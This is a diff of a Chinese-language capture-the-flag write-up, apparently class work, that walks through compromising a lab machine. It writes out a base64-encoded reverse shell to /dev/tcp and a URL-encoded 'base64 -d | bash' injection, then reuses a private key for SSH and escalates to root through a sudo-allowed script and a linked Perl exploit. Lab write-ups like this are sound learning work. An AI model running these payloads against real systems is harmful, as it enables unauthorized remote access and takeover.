@@ -111,11 +111,54 @@ Export看看
 
 還有一個用戶叫做jack
 
-## Reverse Shell
+## Step 4:Reverse Shell
 
 > echo "sh -i >& /dev/tcp/<your_ip>/9001 0>&1" | base64
+ 
 > echo%20%22<your_reverse_shell>%22%20|%20base64%20-d%20|%20bash
 
-![image](https://github.com/FromSouth/Pub-ClassWork/assets/25276693/52a2cf43-a357-4eeb-b3fa-15ed5758aa28)
+成功!!
+![image](https://github.com/Draw0919/Pub-ClassWork/assets/102810421/4809f0d3-98ae-4e27-8789-46e28ce060a7)
 
-Reverse shell 壞了，我不能理解
+找到/opt
+![image](https://github.com/Draw0919/Pub-ClassWork/assets/102810421/b546af85-6a6e-41bd-a8f7-1a823809a01d)
+看看他講了甚麼
+![image](https://github.com/Draw0919/Pub-ClassWork/assets/102810421/faa63a03-8a9d-4325-bc92-af2800147d58)
+
+不太懂為甚麼用5，總之有成功
+![image](https://github.com/Draw0919/Pub-ClassWork/assets/102810421/225e0b1f-e7a6-4c93-a565-ed84e8aa8329)
+## Step 5: Connect
+
+把private key 寫入id_rsa
+![image](https://github.com/Draw0919/Pub-ClassWork/assets/102810421/565a3b2f-1721-4e08-92ac-e6d2857052ce)
+
+連線成功!
+![image](https://github.com/Draw0919/Pub-ClassWork/assets/102810421/7442e244-fd14-4e34-affc-68a6820a8a80)
+
+### Get Flag!
+![image](https://github.com/Draw0919/Pub-ClassWork/assets/102810421/6bbe927f-676b-4a8b-80a7-9a992207d7a5)
+
+`sudo -l發現monitor.sh需要root權限，相當奇怪`
+![image](https://github.com/Draw0919/Pub-ClassWork/assets/102810421/80c06ca1-8e6d-4055-8611-c83bd388273a)
+
+
+![image](https://github.com/Draw0919/Pub-ClassWork/assets/102810421/9c994816-5de2-4c8b-90b7-87eaaffbe21d)
+
+這裡有一個漏洞「perl_startup」權限升級。 這使我能夠以 root 權限執行腳本
+
+[漏洞](https://www.exploit-db.com/exploits/39702)
+![image](https://github.com/Draw0919/Pub-ClassWork/assets/102810421/7ae87de5-4746-4b68-9ac0-ae5094806c9e)
+
+`bash -p`執行安全模式
+![image](https://github.com/Draw0919/Pub-ClassWork/assets/102810421/d30d257b-eb96-4223-89ae-ad16c08a1aa3)
+
+終於!!
+![image](https://github.com/Draw0919/Pub-ClassWork/assets/102810421/6a94e1fe-6ca3-4847-95dd-627def2b763a)
+
+
+
+
+
+
+
+
